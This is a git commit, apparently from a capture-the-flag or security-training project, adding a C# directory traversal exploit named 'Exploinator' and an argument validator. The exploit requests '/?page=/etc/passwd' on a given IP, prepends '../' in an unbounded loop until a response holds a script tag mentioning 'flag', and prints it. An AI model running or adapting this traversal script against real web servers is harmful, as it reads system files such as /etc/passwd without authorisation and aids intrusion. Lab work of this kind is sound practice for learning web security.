6bc77c8863982498329f830331ad74b59f2c51cc
Vladimir Budilov <budilo.w.ladimir@gmail.com>
2024-10-17 01:12:40 +0400

    feat: get alert with flag

---
+++ directory_traverse/Ressources/exploinator/Exploinator.cs
@@ -0,0 +1,38 @@
+﻿using System.Text.RegularExpressions;
+
+namespace exploinator;
+
+public static class Exploinator
+{
+	public static async Task<string> DoWork(string ipAddress)
+	{
+
+		var baseUrl = $"http://{ipAddress}/?page=/";
+		var pageVar = "etc/passwd";
+
+		while (true)
+		{
+			var url = baseUrl + pageVar;
+			var response = await GetPageAsync(url);
+			var scriptTags =
+				Regex.Matches(response, @"<script\b[^>]*>[\s\S]*?<\/script>", RegexOptions.IgnoreCase);
+
+			foreach (Match tag in scriptTags)
+			{
+				if (!tag.Value.Contains("flag")) continue;
+				Console.WriteLine(tag.Value);
+				return tag.Value;
+			}
+
+			pageVar = "../" + pageVar;
+		}
+	}
+	
+	private static async Task<string> GetPageAsync(string url)
+	{
+		using var client = new HttpClient();
+		var response = await client.GetAsync(url);
+		response.EnsureSuccessStatusCode();
+		return await response.Content.ReadAsStringAsync();
+	}
+}
---
+++ directory_traverse/Ressources/exploinator/Validator.cs
@@ -0,0 +1,18 @@
+﻿namespace exploinator;
+
+public static class Validator
+{
+	public static void ValidateArgs(string[] args)
+	{
+		if (args.Length == 1) return;
+		Console.Error.WriteLine("Please provide only an IP address as a parameter.");
+		Environment.Exit(1);
+	}
+
+	public static void ValidateIpAddress(string ipAddress)
+	{
+		if (!string.IsNullOrEmpty(ipAddress)) return;
+		Console.Error.WriteLine("Please provide only an IP address as a parameter.");
+		Environment.Exit(1);
+	}
+}
